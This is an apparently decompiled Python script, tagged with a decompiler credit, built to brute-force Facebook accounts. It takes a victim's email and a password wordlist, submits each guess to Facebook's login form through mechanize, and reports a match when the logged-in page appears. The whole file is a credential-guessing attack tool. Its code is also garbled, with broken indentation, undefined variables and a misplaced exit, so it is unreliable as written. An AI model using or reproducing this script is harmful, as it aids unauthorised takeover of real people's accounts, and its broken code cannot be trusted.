# Decompile by : Hamid Meer'hamii 

# Time Succes decompile : 2022-03-26 18:16:47.173597

import os,mechanize,socket,optparse

server = "www.google.com"

def check():

 try:

	s = socket.gethostbyname(server)	ss =socket.create_connection(s ,80)

        return True

 except:

	pass

 return False

check = check()

parse = optparse.OptionParser('''./tamilan.py -t <example@gmail.com> -w <name of the wordlist>

OPTIONS:

	-T <target email>  --->> victims mailid 

        -w <passfile> -->> wordlist file

 ''')

def Main():

	parse.add_option("-t","target",dest = "taremail", type= "string" ,help = "target email")

	parse.add_option("-w","wordlist",dest = "wordlist" ,type= "string", help = "passfile")

	(options,args) = parse.parse_args()

	if options.taremail != None and option.wordlist != None:

	 user = option.taremail

	 password = option.passfile

	global check

	if check == True:

			try:

			 password = open(password ,"r")

			except:

			 print("no file ")

			exit(1)

			for password in passwordfile:

				try:

					     br1=mechanize.Browser()

                		             br1.set_handle_robots(False)

                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]

                		             op=br1.open("https://facebook.com")

                		             dos1=open("Facebook-Log.txt","w+")		

                	                     br1.select_form(nr=0)

					     br1.form["email"]=user

                		             br1.form["pass"]=password

                		             br1.method="POST"

                		             br1.submit()

               			             dos1.write(br1.open("https://facebook.com").read())

                		             dos1.seek(0)

                		             text=dos1.read().decode("UTF-8")

                                             if(text.find("home_icon",0,len(text))!=-1):

                                                 print("the password is " + password)

                                             else:

						 print("no match password")

					     while check == False:

						  print ("no correct password found in your wordlist")

#thank you!!
